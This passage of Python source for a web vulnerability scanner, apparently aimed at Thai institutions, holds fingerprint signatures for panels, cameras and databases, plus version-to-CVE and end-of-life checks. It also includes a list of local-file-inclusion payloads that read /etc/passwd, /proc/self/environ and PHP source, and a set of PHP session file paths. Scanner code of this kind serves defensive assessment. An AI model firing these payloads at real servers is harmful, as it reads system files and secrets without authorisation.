    ("Webuzo",             [r"\bwebuzo\b"], r"webuzo[^\d<]{0,12}(\d+\.\d+[\d.]*)", "Control Panel"),
    ("CentOS Web Panel",   [r"centos\s*web\s*panel", r"\bcwpsrv\b", r"/cwp-", r"\bcwp\b.{0,20}panel"],
     None, "Control Panel"),
    ("CloudPanel",         [r"cloudpanel"], r"cloudpanel[^\d<]{0,12}(\d+\.\d+[\d.]*)", "Control Panel"),
    ("Virtualmin",         [r"virtualmin"], r"virtualmin[^\d<]{0,12}(\d+\.\d+[\d.]*)", "Control Panel"),
    ("KeyHelp",            [r"keyhelp"], r"keyhelp[^\d<]{0,12}v?(\d+\.\d+[\d.]*)", "Control Panel"),
    ("Sentora/ZPanel",     [r"\bsentora\b", r"\bzpanel\b"], None, "Control Panel"),
    # ── กล้องวงจรปิด / NVR / IoT (กลุ่ม 4 ThaiCERT — อุปกรณ์เครือข่าย) ──
    ("Hikvision Camera/NVR", [r"hikvision", r"/doc/page/login", r"dnvrs-webs", r"dvrdvs-webs",
                              r"app-webs", r"webcomponents\.js"], None, "CCTV/Camera"),
    ("Dahua Camera/NVR",   [r"\bdahua\b", r"/rpc2_login", r"webplugin", r"/current_config/"], None, "CCTV/Camera"),
    ("Axis Camera",        [r"\baxis\b.*camera", r"/axis-cgi/", r"server:\s*axis"], r"axis[^\d]{0,12}([\d.]+)", "CCTV/Camera"),
    ("Uniview Camera/NVR", [r"uniview", r"\bunv\b", r"/cgi-bin/main-cgi"], None, "CCTV/Camera"),
    ("Reolink Camera",     [r"reolink"], None, "CCTV/Camera"),
    ("Vivotek Camera",     [r"vivotek", r"/cgi-bin/viewer/"], None, "CCTV/Camera"),
    ("Mobotix Camera",     [r"mobotix"], None, "CCTV/Camera"),
    ("Generic IP Camera",  [r"ip camera", r"network camera", r"netsurveillance", r"\bonvif\b",
                            r"rtsp://", r"web service of ip camera", r"\bnvr\b.*login"], None, "CCTV/Camera"),
    ("Printer (JetDirect/IPP)", [r"jetdirect", r"hp laserjet", r"/hp/device/", r"brother\b.*printer",
                                 r"epson.*web", r"internet printing protocol"], None, "Printer"),
    # ── Windows Web Stacks (กลุ่ม 6 ThaiCERT) ──
    ("WampServer",         [r"\bwampserver\b", r"/add_vhost\.php", r"wamp\s*server"], r"wampserver[^\d<]{0,12}v?(\d+\.\d+[\d.]*)", "Windows Web Stack"),
    ("Laragon",            [r"\blaragon\b", r"getting started with laragon"], r"laragon[^\d<]{0,12}v?(\d+\.\d+[\d.]*)", "Windows Web Stack"),
]

# ชั้น container / reverse-proxy ที่ "เห็นจากภายนอกได้" (ชั้นในอื่น ๆ ต้องยืนยันบนเครื่อง)
CONTAINER_SIGS = [
    ("Traefik",            [r"\btraefik\b"]),
    ("Kubernetes Ingress", [r"x-kubernetes", r"x-k8s", r"ingress-nginx"]),
    ("Envoy/Istio",        [r"\benvoy\b", r"x-envoy", r"istio"]),
    ("HAProxy",            [r"\bhaproxy\b"]),
    ("Docker (XAMPP/compose hint)", [r"\bxampp\b"]),
    ("Docker Registry",    [r"/v2/_catalog", r"docker-distribution-api-version"]),
    ("Kubernetes API",     [r"kubernetes\s*api", r"/api/v1/namespaces"]),
]

# ── Component detection (DB / admin tools / JS libs) — กลุ่ม "ส่วนประกอบอื่น ๆ" ──
# DB เห็นได้ทางอ้อมเท่านั้น (error/stack trace, phpMyAdmin/Adminer, phpinfo)
# แต่ละตัว: (ชื่อ, [regex สัญญาณ], regex ดึงเวอร์ชัน|None)
DB_SIGS = [
    ("MySQL/MariaDB", [r"you have an error in your sql syntax", r"\bmysqli?_(?:connect|query|fetch|num_rows|error)",
                       r"mysqlnd", r"supplied argument is not a valid mysql", r"warning:\s*mysql"],
     r"(?:mysql|mariadb)[^\d]{0,24}(\d+\.\d+\.\d+)"),
    ("MariaDB", [r"\bmariadb\b"], r"mariadb[^\d]{0,24}(\d+\.\d+\.\d+)"),
    ("PostgreSQL", [r"\bpg_(?:query|connect|exec)\b", r"postgresql", r"\bPG::", r"org\.postgresql"],
     r"postgresql[^\d]{0,16}(\d+(?:\.\d+)+)"),
    ("MSSQL", [r"microsoft sql server", r"system\.data\.sqlclient", r"odbc sql server driver",
               r"\[microsoft\]\[odbc"], r"sql server[^\d]{0,16}(\d+\.\d+)"),
    ("SQLite", [r"sqlite3?::", r"sqliteexception", r"unable to open database file"],
     r"sqlite[^\d]{0,10}(\d+\.\d+\.\d+)"),
    ("Oracle", [r"\bORA-\d{4,5}\b", r"oracle error"], None),
    ("MongoDB", [r"\bmongodb\b", r"mongoerror", r"mongoose"], None),
]
# admin/ops tools — หลายตัวรั่วเวอร์ชันผ่าน header/footer (เช่น X-Jenkins)
TOOL_SIGS = [
    ("phpMyAdmin", [r"phpmyadmin", r"pma_", r"pmauser"], r"phpmyadmin[^\d]{0,14}(\d+\.\d+\.\d+)"),
    ("Adminer", [r"\badminer\b"], r"adminer[^\d]{0,10}(\d+\.\d+\.\d+)"),
    ("phpPgAdmin", [r"phppgadmin"], None),
    ("phpinfo()", [r"phpinfo\(\)", r"<title>phpinfo"], None),
    ("Jenkins", [r"x-jenkins", r"\bjenkins\b"], r"x-jenkins[^\d]{0,6}(\d+\.\d+(?:\.\d+)?)"),
    ("Grafana", [r"\bgrafana\b"], None),
    ("Kibana", [r"\bkibana\b"], None),
]
# JavaScript libraries ฝั่ง client (มี CVE ของตัวเอง เช่น jQuery เก่า XSS) — จาก asset URL/ความคิดเห็นใน JS
JSLIB_SIGS = [
    ("jQuery", r"jquery[.\-/]?(?:ui[.\-]?)?v?(\d+\.\d+\.\d+)(?:\.min)?\.js"),
    ("jQuery", r"jquery[^\"'<>]{0,40}?[?&]ver=(\d+\.\d+\.\d+)"),
    ("jQuery", r"/\*!?\s*jQuery\s+v(\d+\.\d+\.\d+)"),
    ("Bootstrap", r"bootstrap[.\-/]?v?(\d+\.\d+\.\d+)(?:\.min)?\.(?:js|css)"),
    ("Bootstrap", r"bootstrap[^\"'<>]{0,40}?[?&]ver=(\d+\.\d+\.\d+)"),
    ("Vue", r"vue[.\-/]?v?(\d+\.\d+\.\d+)(?:\.min)?\.js"),
    ("React", r"react[.\-/]?v?(\d+\.\d+\.\d+)(?:\.min)?\.js"),
    ("AngularJS", r"angular[.\-/]?v?(\d+\.\d+\.\d+)(?:\.min)?\.js"),
    ("Lodash", r"lodash[.\-/]?v?(\d+\.\d+\.\d+)(?:\.min)?\.js"),
]

def _extract_components(fp, blob_low, blob, body):
    """ตรวจ DB/admin tool/JS library จาก blob (header+cookie+body) และสะสมเข้า fp['components']
    เรียกได้ทั้งตอน fingerprint และระหว่าง crawl ทุกหน้า (ครอบคลุมกว่า)"""
    comps = fp.setdefault("components", [])

    def _add(typ, nm, ver, src):
        for c in comps:
            if c["type"] == typ and c["name"] == nm:
                if ver and not c.get("version"):
                    c["version"], c["source"] = ver, src
                return
        comps.append({"type": typ, "name": nm, "version": ver or "", "source": src})

    for nm, sigs, ver_re in DB_SIGS:
        if any(re.search(s, blob_low) for s in sigs):
            vm = re.search(ver_re, blob, re.I) if ver_re else None
            _add("Database", nm, vm.group(1) if vm else "", "error/signature")
    for nm, sigs, ver_re in TOOL_SIGS:
        if any(re.search(s, blob_low) for s in sigs):
            vm = re.search(ver_re, blob, re.I) if ver_re else None
            _add("Tool", nm, vm.group(1) if vm else "", "signature")
    for nm, ver_re in JSLIB_SIGS:
        jm = re.search(ver_re, body or "", re.I)
        if jm:
            _add("JS Library", nm, jm.group(1), "asset")


CMS_PATTERNS = [
    ("WordPress", [r"/wp-content/", r"/wp-includes/", r"/wp-json/"]),
    ("Drupal", [r"/sites/default/", r"/sites/all/"]),
    ("Joomla", [r"/components/com_", r"/media/jui/"]),
    ("Moodle", [r"/lib/javascript\.php", r"/theme/yui_combo\.php", r"/theme/image\.php", r"moodlesession", r"/mod/forum/"]),
    ("Laravel", [r"laravel_session", r"/_ignition/"]),
    ("CodeIgniter", [r"ci_session"]),
    ("Yii", [r"yii_csrf", r"_identity", r"r=site/login", r"/gii/"]),
    ("Slim", [r"slim_session"]),
]

STATIC_EXT = {".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
              ".ico", ".woff", ".woff2", ".ttf", ".eot", ".webp", ".mp4",
              ".mp3", ".pdf", ".zip", ".gz", ".tar"}

NOISY_PATHS = ["/wp-content/", "/wp-includes/", "/assets/", "/static/",
               "/css/", "/js/", "/fonts/", "/images/", "/img/", "/media/",
               "/uploads/", "/cache/", "/.well-known/", "/node_modules/"]

LFI_PAYLOADS = [
    ("../../../../etc/passwd", "passwd", ["root:x:0:0", "daemon:x:"]),
    ("../../../../../../etc/passwd", "passwd-deep", ["root:x:0:0"]),
    ("....//....//....//etc/passwd", "passwd-bypass", ["root:x:0:0"]),
    ("php://filter/convert.base64-encode/resource=index.php", "phpfilter", None),
    ("../../../../proc/self/environ", "environ", ["PATH=", "HOME="]),
]

PHP_ERR_MARKERS = ["failed to open stream", "no such file or directory",
                   "failed opening", "include(", "require("]

SESSION_PATHS = ["/var/lib/php/sessions/sess_{sid}", "/tmp/sess_{sid}",
                 "/var/lib/php/sess_{sid}", "/var/lib/php7/sess_{sid}",
                 "/var/lib/php8/sess_{sid}"]

VERSION_RE = re.compile(r"PHP/(\d+\.\d+\.\d+)")
NGINX_VER_RE = re.compile(r"(?:nginx|openresty)/(\d+\.\d+\.\d+)", re.I)
NODE_VER_RE = re.compile(
    r"(?:node(?:\.js)?[ /v]+v?|nodejs_version_info\{[^}]*version=\"v?|"
    r"\"node(?:Version|_version)?\"\s*:\s*\"v?)(\d+\.\d+\.\d+)", re.I
)
NEXT_VER_RE = re.compile(
    r"(?:next(?:\.js)?[ /v]+v?|\"next\"\s*:\s*\"[\^~]?|"
    r"window\.next\s*=\s*\{[^}]*version\s*:\s*\")(\d+\.\d+\.\d+)", re.I
)
UNDICI_VER_RE = re.compile(r"undici[ /v]+v?(\d+\.\d+\.\d+)", re.I)

NODEJS_PATCHED = {18: (18, 20, 8), 20: (20, 19, 2), 22: (22, 15, 1), 23: (23, 11, 1), 24: (24, 1, 0)}

# ═══════════════════════════════════════════════════════════════════════
# End-of-Life (สิ้นสุดการสนับสนุนด้านความปลอดภัย) — ตรวจรุ่นที่หมดอายุแล้ว
# รุ่นที่เลย EOL = ไม่ได้รับแพตช์ช่องโหว่ใหม่อีกต่อไป → เป็นความเสี่ยงในตัวเอง
# อ้างอิง endoflife.date (ตรวจสอบ 26 ต.ค. 2026)
# ═══════════════════════════════════════════════════════════════════════
PHP_EOL = {   # (major, minor): วันสิ้นสุด security support "YYYY-MM-DD"
    (8, 5): "2029-12-31", (8, 4): "2028-12-31", (8, 3): "2027-12-31",
    (8, 2): "2026-12-31", (8, 1): "2025-12-31", (8, 0): "2023-11-26",
    (7, 4): "2022-11-28", (7, 3): "2021-12-06", (7, 2): "2020-11-30",
    (7, 1): "2019-12-01", (7, 0): "2019-01-10",
    (5, 6): "2018-12-31", (5, 5): "2016-07-21", (5, 4): "2015-09-14", (5, 3): "2014-08-14",
}
NODEJS_EOL = {   # major: วันสิ้นสุด security support "YYYY-MM-DD"
    26: "2029-04-30", 24: "2028-04-30", 22: "2027-04-30", 20: "2026-04-30",
    25: "2026-06-01", 23: "2025-06-01", 21: "2024-06-01", 19: "2023-06-01",
    18: "2025-04-30", 17: "2022-06-01", 16: "2023-09-11", 15: "2021-06-01",
    14: "2023-04-30", 13: "2020-06-01", 12: "2022-04-30", 11: "2019-06-30",
    10: "2021-04-30", 8: "2019-12-31",
}
NGINX_EOL = {   # (major, minor) ของสาขา: วันสิ้นสุด "YYYY-MM-DD" (1.30/1.31 ยังสนับสนุน → ไม่ใส่)
    (1, 29): "2026-05-13", (1, 28): "2026-04-14", (1, 27): "2025-06-24", (1, 26): "2025-04-23",
    (1, 25): "2024-05-29", (1, 24): "2024-04-23", (1, 23): "2023-05-23", (1, 22): "2023-04-11",
    (1, 21): "2022-06-21", (1, 20): "2022-05-24", (1, 19): "2021-05-25", (1, 18): "2021-04-20",
    (1, 17): "2020-05-26", (1, 16): "2020-04-20", (1, 15): "2019-05-21", (1, 14): "2019-04-23",
}


def _eol_months_past(product, vt):
    """ถ้ารุ่น (version tuple) หมด security support แล้ว คืน (eol_date_str, months_past:int)
    ไม่งั้นคืน None (ยังอยู่ในช่วงสนับสนุน หรือไม่มีข้อมูล)"""
    if not vt or len(vt) < 2:
        return None
    d = None
    if product == "PHP":
        d = PHP_EOL.get((vt[0], vt[1]))
        if d is None and (vt[0], vt[1]) < (5, 3):
            d = "2011-01-06"      # PHP 5.2 ลงไป — EOL นานมาก
    elif product == "Node.js":
        d = NODEJS_EOL.get(vt[0])
        if d is None and 1 <= vt[0] < 8:
            d = "2019-12-31"      # Node 7 ลงไป — EOL นานมาก
    elif product == "NGINX":
        d = NGINX_EOL.get((vt[0], vt[1]))
        if d is None and (vt[0], vt[1]) < (1, 14):
            d = "2019-01-01"      # nginx เก่ากว่า 1.14 — EOL นานมาก
    if not d:
        return None
    try:
        eol = datetime.strptime(d, "%Y-%m-%d")
    except Exception:
        return None
    now = datetime.now()
    if now <= eol:
        return None               # ยังอยู่ในช่วงสนับสนุน
    return d, int((now - eol).days / 30.4)


# ═══════════════════════════════════════════════════════════════════════
# ฐานข้อมูล CVE ย้อนหลัง (เวอร์ชันเก่าที่ยังพบในระบบจริง) — เทียบ "ช่วงที่กระทบ → รุ่นที่แก้"
# แทนการเทียบวัน EOL ตรงๆ: ตรวจว่าเลขเวอร์ชันที่พบ "อยู่ในช่วงกระทบของ CVE ใด และแก้ในรุ่นใด"
# รูปแบบ ranges = [(introduced, fixed)] → เปราะเมื่อ introduced <= version < fixed (fixed = ขอบบนที่ไม่รวม)
# ข้อมูลยืนยันจาก osv.dev (ต.ค. 2026). เป็นชุด CVE ผลกระทบสูงที่คัดเลือก ไม่ใช่รายการครบทุก CVE
# ═══════════════════════════════════════════════════════════════════════
HISTORICAL_CVES = {
    "PHP": [
        {"cve": "CVE-2019-11043", "name": "PHP-FPM env_path_info Underflow RCE",
         "severity": "Critical", "cvss": 9.8, "cond": "fpm",
         "ranges": [((7, 1, 0), (7, 1, 33)), ((7, 2, 0), (7, 2, 24)), ((7, 3, 0), (7, 3, 11))],
         "fixed": "7.1.33 / 7.2.24 / 7.3.11",
         "host_check": "php-fpm -v ; nginx -T 2>/dev/null | grep fastcgi_split_path_info || echo 'ไม่พบ split_path_info (ปลอดภัย)'"},
        {"cve": "CVE-2022-31626", "name": "pdo_mysql Password Buffer Overflow (RCE)",
         "severity": "Critical", "cvss": 9.8, "cond": None,
         "ranges": [((7, 4, 0), (7, 4, 30)), ((8, 0, 0), (8, 0, 20)), ((8, 1, 0), (8, 1, 7))],
         "fixed": "7.4.30 / 8.0.20 / 8.1.7",
         "host_check": "php -m | grep -i mysql && php -v"},
        {"cve": "CVE-2024-4577", "name": "PHP-CGI Argument Injection RCE",
         "severity": "Critical", "cvss": 9.8, "cond": "cgi",
         "ranges": [((8, 1, 0), (8, 1, 29)), ((8, 2, 0), (8, 2, 20)), ((8, 3, 0), (8, 3, 8))],
         "fixed": "8.1.29 / 8.2.20 / 8.3.8",
         "host_check": "php -v && php -i | grep -E '^Server API'"},
        {"cve": "CVE-2016-5385", "name": "PHP httpoxy (HTTP_PROXY Injection)",
         "severity": "High", "cvss": 8.1, "cond": None,
         "ranges": [((5, 5, 0), (5, 5, 38)), ((5, 6, 0), (5, 6, 24)), ((7, 0, 0), (7, 0, 9))],
         "fixed": "5.5.38 / 5.6.24 / 7.0.9",
         "host_check": "php -v ; grep -rn 'HTTP_PROXY' /var/www/ 2>/dev/null || echo 'ไม่พบ HTTP_PROXY ในโค้ด'"},
    ],
    "NGINX": [
        {"cve": "CVE-2021-23017", "name": "NGINX Resolver Off-by-One (DNS → RCE)",
         "severity": "High", "cvss": 8.1, "cond": "resolver",
         "ranges": [((0, 6, 18), (1, 20, 1))],
         "fixed": "1.20.1 / 1.21.0",
         "host_check": "nginx -T 2>/dev/null | grep -E '^\\s*resolver\\s+' || echo 'ไม่พบ directive resolver (ปลอดภัย)'"},
        {"cve": "CVE-2022-41742", "name": "NGINX ngx_http_mp4_module OOB (RCE/DoS)",
         "severity": "High", "cvss": 7.0, "cond": "mp4",
         "ranges": [((1, 1, 3), (1, 22, 1)), ((1, 23, 0), (1, 23, 2))],
         "fixed": "1.22.1 / 1.23.2",
         "host_check": "nginx -V 2>&1 | grep mp4 ; nginx -T 2>/dev/null | grep -E '^\\s*mp4;' || echo 'ไม่พบ directive mp4'"},
    ],
    "Node.js": [
        {"cve": "CVE-2021-22930", "name": "Node.js HTTP/2 Use-After-Free (RCE)",
         "severity": "Critical", "cvss": 9.8, "cond": None,
         "ranges": [((12, 0, 0), (12, 22, 4)), ((14, 0, 0), (14, 17, 4)), ((16, 0, 0), (16, 6, 0))],
         "fixed": "12.22.4 / 14.17.4 / 16.6.0",
         "host_check": "node -v   # ต้อง >= 12.22.4 / 14.17.4 / 16.6.0 (หรือ >= 18.x)"},
        {"cve": "CVE-2023-30581", "name": "Node.js Policy Bypass (mainModule __proto__)",
         "severity": "Medium", "cvss": 5.3, "cond": "policy",
         "ranges": [((16, 0, 0), (16, 20, 1)), ((18, 0, 0), (18, 16, 1)), ((20, 0, 0), (20, 3, 1))],
         "fixed": "16.20.1 / 18.16.1 / 20.3.1",
         "host_check": "node -v ; ps aux | grep node | grep 'experimental-policy' || echo 'ไม่ได้เปิด policy (ปลอดภัย)'"},
    ],
}

# คำอธิบายเงื่อนไข (cond) ที่ยังต้องยืนยันบนเครื่อง — เวอร์ชันอยู่ในช่วงกระทบแล้ว แต่เวกเตอร์ต้องการเงื่อนไขเพิ่ม
_CVE_COND_TXT = {
    "fpm":      " — เวกเตอร์ต้องใช้ PHP-FPM (fastcgi) ยืนยัน SAPI บนเครื่อง",
    "cgi":      " — เวกเตอร์ต้องใช้ php-cgi/mod_cgi (มักบน Windows) ยืนยัน SAPI บนเครื่อง",
    "resolver": " — ช่องโหว่ทำงานเมื่อ nginx ใช้ directive 'resolver' ยืนยันใน nginx -T",
    "mp4":      " — ต้องคอมไพล์ ngx_http_mp4_module + เปิด directive mp4 ยืนยันใน nginx -V",
    "policy":   " — กระทบเฉพาะเมื่อเปิด --experimental-policy (policy.json)",
}


def _match_historical_cves(product, vt, fp=None):
    """เทียบเวอร์ชันที่ตรวจพบกับ CVE ย้อนหลัง — คืน {cve_id: finding} เฉพาะ CVE ที่
    เวอร์ชันนี้ยังอยู่ในช่วงกระทบ (introduced <= version < fixed)
    สถานะ: version-only = 'vulnerable-version' (รุ่นที่มีช่องโหว่ ต้องอัปเดต),
    ถ้ามีสัญญาณเงื่อนไขตรง (เช่น PHP-FPM) → ยก 'likely-vulnerable'"""
    out = {}
    if not vt or len(vt) < 3:
        return out
    fp = fp or {}
    sapi = (fp.get("sapi") or "").lower()
    for meta in HISTORICAL_CVES.get(product, []):
        if not any(lo <= vt < fx for lo, fx in meta["ranges"]):
            continue
        ver_str = ".".join(str(x) for x in vt)
        cond = meta.get("cond")
        status = "vulnerable-version"
        cond_txt = _CVE_COND_TXT.get(cond, "")
        if cond == "fpm" and sapi == "php-fpm":
            status = "likely-vulnerable"; cond_txt = " + ตรวจพบ PHP-FPM (ตรงเงื่อนไขช่องโหว่)"
        elif cond == "fpm" and sapi == "mod_php":
            cond_txt = " (พบ mod_php ไม่ใช่ FPM — เวกเตอร์หลักต้องใช้ PHP-FPM ควรยืนยัน)"
        elif cond == "cgi" and sapi in ("php-cgi", "cgi"):
            status = "likely-vulnerable"; cond_txt = " + ตรวจพบ PHP-CGI (ตรงเงื่อนไขช่องโหว่)"
        # หมายเหตุ EOL (ถ้ารุ่นหมดอายุด้วย) — เป็นข้อมูลเสริม ไม่ใช่ตัวตัดสินหลัก
        eol = _eol_months_past(product, vt)
        eol_txt = f" [รุ่นนี้ EOL ตั้งแต่ {eol[0]} — ไม่มีแพตช์ย้อนหลัง ต้องย้ายไปสาขาที่รองรับ]" if eol else ""
        out[meta["cve"]] = {
            "cve": meta["cve"], "name": meta["name"], "severity": meta["severity"],
            "trigger": "เทียบเลขเวอร์ชันกับ CVE",
            "host_check": meta.get("host_check", ""),
            "status": status,
            "reason": (f"{product} {ver_str} อยู่ในช่วงกระทบของ {meta['cve']} "
                       f"(CVSS {meta.get('cvss', '?')}) — แก้ไขแล้วในรุ่น {meta['fixed']}{cond_txt}{eol_txt}"),
        }
    return out


# ═══════════════════════════════════════════════════════════════════════
# เกณฑ์เวอร์ชันที่ยังได้รับการสนับสนุน (security patch) — อ้างอิง release/EOL (endoflife.date, ต.ค. 2026)
# เหตุผลที่ต้องมี: ฐานข้อมูล CVE "ไม่ระบุสาขาที่ EOL แล้ว" ในช่วงกระทบ (เช่น PHP 5.4.45 ซึ่งเป็นรุ่น
# สุดท้ายของสาขา 5.4 ปี 2015) ดังนั้นการเทียบช่วง CVE เพียงอย่างเดียวจะ "มองข้าม" รุ่นเก่ามาก
# จึงต้องตรวจสถานะการสนับสนุนควบคู่กัน (เหมือนปลั๊กอิน "Unsupported Version" ของสแกนเนอร์มืออาชีพ)
# ═══════════════════════════════════════════════════════════════════════
PHP_SUPPORTED = {(8, 5): (8, 5, 12), (8, 4): (8, 4, 27), (8, 3): (8, 3, 36), (8, 2): (8, 2, 35)}
NGINX_SUPPORTED = {(1, 31): (1, 31, 8), (1, 30): (1, 30, 6)}      # สาขา stable/mainline ปัจจุบัน
NODEJS_SUPPORTED = {26: (26, 12, 1), 24: (24, 22, 1), 22: (22, 23, 4)}  # LTS/current ที่ยังรองรับ


def _support_status(product, vt):
    """คืน status การสนับสนุนของสาขาเวอร์ชัน: 'current' | 'outdated' | 'eol' | 'unknown'"""
    if not vt or len(vt) < 2:
        return "unknown"
    if product == "PHP":
        br, sup = (vt[0], vt[1]), PHP_SUPPORTED
    elif product == "NGINX":
        br, sup = (vt[0], vt[1]), NGINX_SUPPORTED
    elif product == "Node.js":
        br, sup = vt[0], NODEJS_SUPPORTED
    else:
        return "unknown"
    if br in sup:
        return "current" if vt >= sup[br] else "outdated"
    return "eol"


def _unsupported_finding(product, vt):
    """สร้าง finding เมื่อเวอร์ชันอยู่บนสาขาที่ EOL (หยุดรับแพตช์ CVE แล้ว)
    — จำเป็นเพราะ CVE DB ไม่ระบุสาขา EOL ในช่วงกระทบ. คืน None ถ้าสาขายังรองรับ"""
    if _support_status(product, vt) != "eol":
        return None
    ver = ".".join(str(x) for x in vt)
    em = _eol_months_past(product, vt)
    date = em[0] if em else "(ก่อนหน้าสาขาที่รองรับ)"
    months = em[1] if em else 999
    yrs = months // 12
    age = f"~{yrs} ปี" if yrs >= 1 else f"~{months} เดือน"
    # EOL นาน ≥ 2 ปี → ความเสี่ยงสูง (vulnerable bucket); ไม่งั้น warning
    if months >= 24:
        sev, status = "Critical", "high-risk"
    else:
        sev, status = "High", "vulnerable-version"
    upg = {"PHP": "8.3 / 8.4 (หรือ 8.2 จนถึง ธ.ค. 2026)",
           "NGINX": "1.30.x (stable) หรือ 1.31.x (mainline)",
           "Node.js": "22 / 24 LTS ขึ้นไป"}.get(product, "รุ่นที่รองรับ")
    chk = {"PHP": "php -v", "NGINX": "nginx -v", "Node.js": "node -v"}.get(product, "")
    pid = {"PHP": "UNSUPPORTED-PHP", "NGINX": "UNSUPPORTED-NGINX", "Node.js": "UNSUPPORTED-NODEJS"}[product]
    return {
        "cve": pid,
        "name": f"{product} {ver} — รุ่นหมดอายุ ไม่รับแพตช์ความปลอดภัย (Unsupported)",
        "severity": sev, "status": status,
        "trigger": "สาขา EOL (End-of-Life)",
        "host_check": f"{chk}   # ย้ายไปสาขาที่รองรับ: {upg}",
        "reason": (f"{product} {ver} อยู่บนสาขาที่สิ้นสุดการสนับสนุนตั้งแต่ {date} ({age}) — "
                   f"หยุดรับแพตช์ CVE ทั้งหมดตั้งแต่นั้น ทุกช่องโหว่ที่เปิดเผยภายหลังยังไม่ถูกแก้บนรุ่นนี้ "
                   f"(เหตุที่การเทียบช่วง CVE อย่างเดียวมองข้ามรุ่นนี้: ฐานข้อมูล CVE ไม่ระบุสาขา EOL ในช่วงกระทบ) "
                   f"ควรย้ายไปสาขา {upg} โดยด่วน"),
    }


SEVERITY_COLORS = {"Critical": "#c62828", "High": "#ef6c00",
                   "Medium-High": "#ef6c00", "Medium": "#f9a825",
                   "Low": "#2e7d32", "Info": "#757575"}

STATUS_BUCKETS = {
    "safe": {"patched", "not-exploitable", "n/a", "mitigated"},
    "vulnerable": {"vulnerable", "high-risk", "likely-vulnerable", "unpatched"},
    "warning": {"medium-risk", "vulnerable-version", "vulnerable-conditions"},
    "unknown": {"unknown"},
}

STATUS_LABELS = {"patched": "แพตช์แล้ว", "not-exploitable": "โจมตีไม่ได้",
                 "n/a": "ไม่เกี่ยวข้อง", "mitigated": "ลดความเสี่ยงแล้ว",
                 "vulnerable": "เสี่ยง", "high-risk": "เสี่ยงสูง",
                 "likely-vulnerable": "น่าจะเสี่ยง",
                 "vulnerable-conditions": "ต้องตรวจยืนยัน",
                 "medium-risk": "เสี่ยงกลาง", "vulnerable-version": "รุ่นที่มีช่องโหว่",
                 "unknown": "ยังสรุปไม่ได้"}

# คำอธิบายเพิ่มเติมของแต่ละสถานะ (ใช้แสดงในคำบรรยายรายงาน)
STATUS_EXPLAIN = {
    "vulnerable":           "ยืนยันจากภายนอกแล้วว่ามีช่องโหว่ — ต้องแก้ไขทันที",
    "high-risk":            "ความเสี่ยงสูงมาก — ต้องแก้ไขโดยเร็ว",
    "likely-vulnerable":    "เวอร์ชันและพฤติกรรมบ่งชี้ว่าเสี่ยง — ยังไม่ยืนยัน 100% ควรตรวจสอบบนเครื่อง",
    "vulnerable-conditions":"ตรวจพบสัญญาณเสี่ยงจากภายนอก แต่ต้องยืนยันการตั้งค่าบนเซิร์ฟเวอร์จริง",
    "medium-risk":          "ความเสี่ยงระดับกลาง — ควรแก้ไขในรอบถัดไป",
    "vulnerable-version":   "ใช้รุ่นซอฟต์แวร์ที่ทราบว่ามีช่องโหว่ — ต้องอัปเดต",
    "unknown":              "ซ่อนข้อมูลบางส่วน ยังสรุปจากภายนอกไม่ได้ — ต้องตรวจบนเครื่องจริง",
    "patched":              "อัปเดตแพตช์แล้ว ไม่พบช่องโหว่นี้",
    "not-exploitable":      "มีการตั้งค่าที่ป้องกันช่องโหว่นี้ไว้แล้ว",
    "mitigated":            "ลดความเสี่ยงได้บางส่วน — ยังควรอัปเดตเมื่อมีแพตช์",
    "n/a":                  "ช่องโหว่นี้ไม่เกี่ยวกับซอฟต์แวร์ที่โฮสต์นี้ใช้",
}

BUCKET_LABELS = {"safe": "ปลอดภัย", "vulnerable": "เสี่ยง",
                 "warning": "อาจเสี่ยง", "unknown": "ไม่ทราบ"}

RMUT_BLUE = colors.HexColor("#1a237e") if HAS_REPORTLAB else None
RMUT_LIGHT = colors.HexColor("#e8eaf6") if HAS_REPORTLAB else None


# ═══════════════════════════════════════════════════════════════════════
# SECTION 2 — Utilities
# ═══════════════════════════════════════════════════════════════════════

def unique_output_path(directory, base_name, ext):
    """สร้าง path ไม่ซ้ำ: base.ext → base_TS.ext → base_TS_2.ext ..."""
    d = Path(directory)
    d.mkdir(parents=True, exist_ok=True)
    path = d / f"{base_name}{ext}"
    if not path.exists():
        return path
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = d / f"{base_name}_{ts}{ext}"
    if not path.exists():
        return path
    n = 2
    while True:
        path = d / f"{base_name}_{ts}_{n}{ext}"
        if not path.exists():
            return path
        n += 1


def safe_name(text):
    return re.sub(r"[^a-zA-Z0-9._-]", "_", text)


def parse_semver(v):
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", v or "")
    return tuple(int(x) for x in m.groups()) if m else None


def in_range(ver, lo, hi):
    return lo <= ver <= hi


def classify_php(vt):
    major, minor, patch = vt
    if major > 8: return "patched"
    if major < 8: return "n/a"          # PHP 5.x/7.x ไม่ได้รับผลกระทบ — CVE-2026-109618/119 เฉพาะ PHP 8.2+
    if minor < 2: return "vulnerable"   # PHP 8.0/8.1 อาจกระทบแต่ EOL แล้ว ไม่มี patch ให้
    key = (8, minor)
    if key in PHP_PATCHED:
        return "patched" if patch >= PHP_PATCHED[key] else "unpatched"
    return "patched"


def classify_nodejs(vt):
    """จำแนกเวอร์ชัน Node.js เทียบกับรุ่นที่แพตช์แล้ว (NODEJS_PATCHED)"""
    if not vt or len(vt) < 3:
        return "unknown"
    major = vt[0]
    if major > max(NODEJS_PATCHED.keys()):
        return "patched"
    if major < min(NODEJS_PATCHED.keys()) or major in (19, 21):
        return "vulnerable"  # รุ่น EOL ที่ไม่ได้รับแพตช์ความปลอดภัยแล้ว
    if major in NODEJS_PATCHED:
        return "patched" if vt >= NODEJS_PATCHED[major] else "unpatched"
    return "vulnerable"


def hash_body(text):
    return hashlib.md5(re.sub(r"\s+", " ", text or "").strip().encode()).hexdigest()


def is_static(path):
    return any(path.lower().endswith(e) for e in STATIC_EXT)


def is_noisy(path):
    return any(p in path.lower() for p in NOISY_PATHS)


def is_private_host(url):
    host = urlparse(url).hostname or ""
    return bool(re.match(
        r"^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|localhost$)",
        host))


def normalize_target(target):
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    p = urlparse(target)
    return f"{p.scheme}://{p.netloc}", (p.path.rstrip("/") if p.path else "")


def extract_domain(raw):
    """กรอง 1 token ให้เหลือเฉพาะโดเมน/IP จริง — ตัด scheme, path, query, fragment, user:pass
